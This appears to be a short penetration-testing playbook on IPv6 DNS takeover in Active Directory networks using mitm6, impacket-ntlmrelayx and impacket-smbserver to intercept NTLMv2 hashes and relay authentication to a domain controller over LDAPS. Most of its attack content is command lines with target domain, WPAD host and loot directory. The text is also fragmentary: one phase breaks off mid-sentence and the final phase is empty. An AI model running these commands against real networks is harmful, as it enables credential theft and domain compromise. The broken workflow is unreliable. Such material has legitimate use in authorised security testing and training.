# IPv6 DNS Takeover via mitm6

## When to Use
- When operating in an Active Directory internal network and traditional IPv4 poisoners (like Responder/LLMNR/NBT-NS) are disabled or ineffective.
- To take advantage of Windows' default behavior of preferring IPv6 over IPv4, seizing control of internal DNS resolution to intercept NTLMv2 hashes or relay authentication.


## Prerequisites
- Network access to the target subnet (VPN, pivot, or direct connection)
- Nmap and relevant network scanning tools installed
- Understanding of TCP/IP, common protocols, and network segmentation
- Root/admin access on the attack machine for raw socket operations

## Workflow

### Phase 1: Understanding the IPv6 Preference

```text
# Concept: By default ```

### Phase 2: Running mitm6

```bash
# # mitm6 -d targetdomain.local -i eth0
```

### Phase 3: Setting up the Relay or Capture

```bash
# impacket-ntlmrelayx -6 -t ldaps://domain-controller.targetdomain.local -wh attacker-wpad -l lootdir/

# # impacket-smbserver -smb2support share /tmp/loot (with responder running )
```

### Phase 4: Exploiting the Spoofed Traffic
